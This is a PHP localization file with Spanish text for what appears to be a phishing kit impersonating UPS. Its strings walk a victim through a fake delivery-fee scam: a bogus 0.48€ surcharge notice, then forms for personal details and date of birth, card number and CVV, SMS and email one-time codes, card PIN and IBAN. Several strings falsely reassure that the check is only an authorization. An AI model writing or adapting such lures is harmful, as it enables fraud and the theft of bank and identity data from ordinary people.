<?php
function lang($phrase){
	static $lang = array(

        "xlang" => "ES",
        "xcapt1" => "Por favor, marque la casilla CAPTCHA",
        "xcapt2" => "Verificación",
        "xcapt3" => "Continuar",
        "xfot1" => "Este Sitio",
        "xfot2" => "Otros sitios de UPS",
        "xfot3" => "Conéctese con nosotros",
        "xfot4" => "Legal",
        "xfot5" => "Copyright ©1994- 2023&nbsp;United Parcel Service of America, Inc. Todos los derechos reservados. ",
        "xind1" => "Seguimiento",
        "xind2" => "Número de seguimiento",
        "xind3" => "Error : Por favor, proporcione el número de seguimiento correcto",
        "xind4" => "¿Necesita ayuda para cambiar su entrega?",
        "xind5" => "Presupuesto",
        "xind6" => "Enviar",
        "xind7" => "Facturación",
        "xind8" => "Obtener ayuda",
        "xexp1" => "Entrega interrumpida",
        "xexp2" => "Seguimiento",
        "xexp3" => "Su última entrega ha sido interrumpida. Actualmente está retenida en el centro de clasificación",
        "xexp4" => "El paquete que se le envió no respetaba el peso indicado, y se le pedirá que pague un suplemento para garantizar la entrega correcta de su paquete",
        "xexp5" => "El cargo es de 0,48€",
        "xexp6" => "Para pagar, haga clic en el botón de abajo",
        "xexp7" => "Pagar",
        "xexp8" => "Una vez pagada la tasa, su paquete será enviado lo más rápidamente posible a la dirección de entrega",
        "xexp9" => "Si la tasa no se paga en 48 horas, el paquete será devuelto al remitente",
        "xexp10" => "Seguimiento por número de referencia",
        "xexp11" => "Números de seguimiento de importación",
        "xexp12" => "Otros Servicios de Seguimiento",
        "xinfz1" => "Confirme sus datos de facturación",
        "xinfz10" => "Fecha de nacimiento",
        "xinfz2" => "Nombre completo",
        "xinfz3" => "País",
        "xinfz4" => "Ciudad",
        "xinfz5" => "Dirección",
        "xinfz6" => "Teléfono",
        "xinfz7" => "Código postal",
        "xinfz8" => "Error : Todos los datos son obligatorios",
        "xinfz9" => "Confirmar",
        "xpay1" => "Datos de pago",
        "xpay2" => "Estimado cliente, compruebe sus datos de pago correctamente y haga coincidir los datos de su tarjeta para finalizar",
        "xpay3" => "Nombre en la tarjeta",
        "xpay4" => "Número de tarjeta",
        "xpay5" => "Fecha de caducidad",
        "xpay6" => "Código de seguridad CVV (3 dígitos)",
        "xpay7" => "Error : Se requieren todos los datos",
        "xpay8" => "Confirmar",
        "xsms1" => "Verificación",
        "xsms2" => "Hemos enviado un código de confirmación a su número",
        "xsms3" => "Código OTP",
        "xsms4" => "Error : Código otp incorrecto",
        "xsms5" => "Este paso es necesario para completar su proceso de pago de forma segura",
        "xsms6" => "UPS realiza una autenticación temporal en su tarjeta para verificarla. Esto es sólo una autorización y NO un cargo",
        "xsms7" => "Confirmar",
        "xconf1" => "Reanudación de entrega",
        "xconf2" => "Se ha tenido en cuenta el pago de los gastos adicionales",
        "xconf3" => "Su paquete debería llegar en las próximas 24 horas",
        "xconf4" => "Confirmar",
        "xpin1" => "Verificación",
        "xpin2" => "Introduzca el código pin de su tarjeta bancaria",
        "xpin3" => "Código pin",
        "xpin4" => "(4 dígitos)",
        "xpin5" => "Este paso es necesario para completar de forma segura su proceso de pago",
        "xpin6" => "UPS realiza una verificación temporal de su tarjeta para verificarla. Esto es sólo una autorización y NO un cargo",
        "xpin7" => "Confirmar",
        "xmail1" => "Verificación",
        "xmail2" => "Hemos enviado un código de confirmación a su correo electrónico",
        "xmail3" => "Código de correo electrónico",
        "xmail4" => "(6 dígitos)",
        "xmail5" => "Este paso es necesario para completar de forma segura su proceso de pago",
        "xmail6" => "UPS realiza una verificación temporal de su tarjeta para verificarla. Esto es sólo una autorización y NO un cargo",
        "xmail7" => "Confirmar",
        "xiban1" => "Verificación",
        "xiban2" => "Por favor, introduzca su IBAN para completar el pago",
        "xiban3" => "IBAN",
        "xiban4" => "(IBAN)",
        "xiban5" => "Este paso es necesario para completar de forma segura su proceso de pago",
        "xiban6" => "UPS realiza una verificación temporal de su tarjeta para verificarla. Esto es sólo una autorización y NO un cargo",
        "xiban7" => "Confirmar"
	);	
	
	return $lang[$phrase];
}
 ?>